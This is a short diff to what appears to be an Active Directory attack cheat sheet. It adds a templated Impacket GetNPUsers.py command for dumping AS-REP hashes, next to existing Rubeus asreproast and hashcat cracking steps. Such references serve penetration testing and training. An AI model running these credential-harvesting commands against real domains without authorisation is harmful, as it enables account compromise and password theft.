@@ -253,6 +253,12 @@ This command will run the AS-REP roast command looking for vulnerable users and 
 ```
 Command : .\Rubeus.exe asreproast
 ```
+
+#### Dumping KRBASREP5 Hashes w/ Impacket GetNPUsers.py
+```
+Command : python3 GetNPUsers.py {Domain}/ -usersfile {UserList} -no-pass -dc-ip {IP}
+```
+
 #### Crack those Hashes w/ hashcat
 
 crack those hashes! Rubeus AS-REP Roasting uses hashcat mode 18200 or John the ripper.
